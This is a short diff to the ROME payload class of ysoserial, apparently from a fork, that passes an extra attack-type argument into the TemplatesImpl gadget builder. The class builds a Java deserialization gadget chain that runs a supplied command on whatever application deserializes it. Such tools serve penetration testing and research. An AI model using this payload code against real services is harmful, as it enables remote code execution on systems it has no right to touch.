@@ -31,9 +31,11 @@ import ysoserial.payloads.util.PayloadRunner;
 @Dependencies("rome:rome:1.0")
 @Authors({ Authors.MBECHLER })
 public class ROME implements ObjectPayload<Object> {
+	
+	// federicodotta - All supported (TemplateImpl)
 
     public Object getObject ( String command, String attackType) throws Exception {
-        Object o = Gadgets.createTemplatesImpl(command);
+        Object o = Gadgets.createTemplatesImpl(command, attackType);
         ObjectBean delegate = new ObjectBean(Templates.class, o);
         ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
